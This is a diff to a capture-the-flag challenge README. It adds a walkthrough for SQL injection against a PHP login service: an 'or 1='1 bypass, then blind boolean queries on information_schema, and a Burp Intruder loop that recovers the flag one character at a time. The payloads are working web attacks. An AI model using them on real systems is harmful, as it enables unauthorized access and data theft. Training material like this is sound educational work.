@@ -28,9 +28,17 @@ Simpe SQL injections in PHP service.
 
 ## Solutions
 
-1. Try to inject something like ```'or 1='1``` after parameters. Flag is waiting for you at ```welcome.php``` page.
+1. Try to inject something like `'or 1='1` after parameters. Flag is waiting for you at `welcome.php` page.
 
-2. Oh, I'm pretty lazy to prepare a write-up for a blind SQLi. Just follow usual time-based techniques and try to get flag from table with name ```secret```.
+2.1. So, we have blind SQL injection and the conditions are: if sql query returns true (with injection in password field), we will be redirected to `welcome.php` page or we will have an error in other way.
+
+2.2. Of course, we are dealing with MySQL and can dump some table names with a query like `' or (select count(*) from information_schema.tables where table_name LIKE '%flag%') > 0 and '1' = '1`. 
+
+2.3. We need to know the table name where the flag is stored and than we can start to guess column names with something like `' or (select count(*) from information_schema.tables where table_name = 'secret' and column_name = 'flag') > 0 and '1' = '1`. 
+
+2.4. Than we can prepare our payload for Burp Suite: let's use `' or (select SUBSTR(flag, 1, 1) from secret) = '$a$' and '1' = '1` in intruder, where '$a$' is a parameter name with values in range `A-Z, a-z, 0-9, _, {, }`.
+
+2.5. Do that in a loop changing `SUBSTR(flag, 1, 1)` to `SUBSTR(flag, 2, 1)` and so on. This method will give us full flag letter by letter.
 
 ## Flags
 
